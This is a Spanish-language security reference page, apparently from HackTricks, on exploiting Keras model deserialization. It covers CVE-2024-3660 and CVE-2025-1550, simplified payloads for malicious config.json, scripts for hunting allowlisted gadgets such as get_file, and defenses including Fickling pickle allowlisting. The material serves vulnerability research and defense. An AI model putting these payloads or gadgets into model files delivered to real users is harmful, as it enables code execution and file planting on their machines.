# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Esta página resume técnicas prácticas de explotación contra la canalización de deserialización de modelos de Keras, explica los internos del formato nativo .keras y la superficie de ataque, y proporciona un kit de herramientas para investigadores para encontrar Model File Vulnerabilities (MFVs) y post-fix gadgets.

## Internos del formato de modelo .keras

Un archivo .keras es un ZIP que contiene al menos:
- metadata.json – generic info (e.g., Keras version)
- config.json – model architecture (primary attack surface)
- model.weights.h5 – weights in HDF5

El config.json impulsa la deserialización recursiva: Keras importa módulos, resuelve clases/funciones y reconstruye capas/objetos a partir de diccionarios controlados por el atacante.

Ejemplo de fragmento para un objeto Dense layer:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization performs:
- Importación de módulos y resolución de símbolos desde las claves module/class_name
- Invocación de from_config(...) o del constructor con kwargs controlados por el atacante
- Recursión en objetos anidados (activations, initializers, constraints, etc.)

Históricamente, esto exponía tres primitivas a un atacante que confeccionara config.json:
- Control sobre qué módulos se importan
- Control sobre qué clases/funciones se resuelven
- Control de los kwargs pasados a constructores/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Causa raíz:
- Lambda.from_config() usaba python_utils.func_load(...), que decodifica base64 y llama a marshal.loads() sobre bytes del atacante; el unmarshalling de Python puede ejecutar código.

Exploit idea (simplified payload in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigación:
- Keras aplica safe_mode=True por defecto. Las funciones Python serializadas en Lambda están bloqueadas a menos que un usuario explícitamente opte por desactivar con safe_mode=False.

Notas:
- Los formatos legacy (HDF5 antiguos) o bases de código más antiguas pueden no aplicar las comprobaciones modernas, por lo que ataques estilo “downgrade” aún pueden aplicarse cuando las víctimas usan loaders antiguos.

## CVE-2025-1550 – Importación arbitraria de módulos en Keras ≤ 3.8

Causa raíz:
- _retrieve_class_or_fn usaba importlib.import_module() sin restricciones con cadenas de módulo controladas por el atacante provenientes de config.json.
- Impacto: Importación arbitraria de cualquier módulo instalado (o de un módulo plantado por el atacante en sys.path). Se ejecuta el código en tiempo de importación, y después la construcción del objeto se realiza con kwargs controlados por el atacante.

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Mejoras de seguridad (Keras ≥ 3.9):
- Lista blanca de módulos: importaciones restringidas a los módulos del ecosistema oficial: keras, keras_hub, keras_cv, keras_nlp
- Modo seguro por defecto: safe_mode=True bloquea la carga de funciones serializadas Lambda inseguras
- Comprobación básica de tipos: los objetos deserializados deben coincidir con los tipos esperados

## Superficie de gadgets post-fix dentro de la lista blanca

Incluso con la lista blanca y el modo seguro, queda una amplia superficie entre los callables permitidos de Keras. Por ejemplo, keras.utils.get_file puede descargar URLs arbitrarias a ubicaciones seleccionables por el usuario.

Gadget mediante Lambda que referencia una función permitida (no bytecode Python serializado):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Limitación importante:
- Lambda.call() antepone el tensor de entrada como el primer argumento posicional al invocar el callable objetivo. Los gadgets seleccionados deben tolerar un argumento posicional extra (o aceptar *args/**kwargs). Esto restringe qué funciones son viables.

Impactos potenciales de los gadgets allowlisted:
- Descarga/escritura arbitraria (path planting, config poisoning)
- Callbacks de red/efectos SSRF-like dependiendo del entorno
- Encadenamiento hacia ejecución de código si las rutas escritas son posteriormente importadas/ejecutadas o añadidas a PYTHONPATH, o si existe una writable execution-on-write location

## Kit de herramientas para investigadores

1) Descubrimiento sistemático de gadgets en módulos permitidos

Enumerar callables candidatos en keras, keras_nlp, keras_cv, keras_hub y priorizar aquellos con efectos secundarios sobre archivos, red, procesos o variables de entorno.
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) Pruebas de deserialización directa (no se necesita archivo .keras)

Alimenta dicts diseñados directamente a los deserializadores de Keras para aprender los parámetros aceptados y observar efectos secundarios.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Sondeo entre versiones y formatos

Keras existe en múltiples bases de código/eras con diferentes protecciones y formatos:
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, slated for deletion)
- tf-keras: maintained separately
- Multi-backend Keras 3 (official): introduced native .keras

Repite las pruebas a través de las distintas bases de código y formatos (.keras vs legacy HDF5) para descubrir regresiones o protecciones faltantes.

## Defensive recommendations

- Trata los archivos de modelo como entrada no confiable. Solo carga modelos desde fuentes de confianza.
- Mantén Keras actualizado; usa Keras ≥ 3.9 para beneficiarte de allowlisting y comprobaciones de tipos.
- No establezcas safe_mode=False al cargar modelos a menos que confíes plenamente en el archivo.
- Considera ejecutar la deserialización en un entorno sandbox con privilegios mínimos, sin egress de red y con acceso restringido al sistema de archivos.
- Aplica listas de permitidos/signatures para las fuentes de modelos y comprobación de integridad cuando sea posible.

## ML pickle import allowlisting for AI/ML models (Fickling)

Muchos formatos de modelos AI/ML (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, artefactos antiguos de TensorFlow, etc.) incrustan datos de Python pickle. Los atacantes abusan rutinariamente de las importaciones GLOBAL de pickle y de los constructores de objetos para conseguir RCE o la sustitución de modelos durante la carga. Los escáneres basados en listas negras a menudo no detectan importaciones peligrosas nuevas o no listadas.

Una defensa práctica de tipo "fail-closed" es interceptar el deserializador de pickle de Python y permitir solo un conjunto revisado de importaciones relacionadas con ML que sean inofensivas durante la deserialización (unpickling). Trail of Bits’ Fickling implementa esta política e incluye una lista seleccionada de importaciones de ML (allowlist) construida a partir de miles de pickles públicos de Hugging Face.

Modelo de seguridad para importaciones "seguras" (intuiciones destiladas de la investigación y la práctica): los símbolos importados usados por un pickle deben simultáneamente:
- No ejecutar código ni provocar ejecución (no objetos de código compilado/fuente, ejecución de comandos en shell, hooks, etc.)
- No obtener/establecer atributos o elementos arbitrarios
- No importar u obtener referencias a otros objetos de Python desde la VM de pickle
- No activar deserializadores secundarios (p. ej., marshal, pickle anidado), ni siquiera de forma indirecta

Habilita las protecciones de Fickling lo antes posible en el arranque del proceso para que cualquier carga de pickle realizada por frameworks (torch.load, joblib.load, etc.) sea comprobada:
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Consejos operativos:
- Puedes desactivar/reactivar temporalmente los hooks cuando sea necesario:
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Si un known-good model está bloqueado, extiende la allowlist para tu entorno después de revisar los símbolos:
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling también expone salvaguardas genéricas en tiempo de ejecución si prefieres un control más granular:
- fickling.always_check_safety() to enforce checks for all pickle.load()
- with fickling.check_safety(): for scoped enforcement
- fickling.load(path) / fickling.is_likely_safe(path) for one-off checks

- Prefiere formatos de modelo que no sean pickle cuando sea posible (e.g., SafeTensors). Si debes aceptar pickle, ejecuta los loaders con el mínimo privilegio, sin salida de red y aplica la allowlist.

Esta estrategia allowlist-first bloquea de forma demostrable las rutas de explotación comunes de pickle en ML mientras mantiene alta la compatibilidad. En el benchmark de ToB, Fickling señaló el 100% de los archivos maliciosos sintéticos y permitió ~99% de los archivos limpios de los repositorios principales de Hugging Face.

## References

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
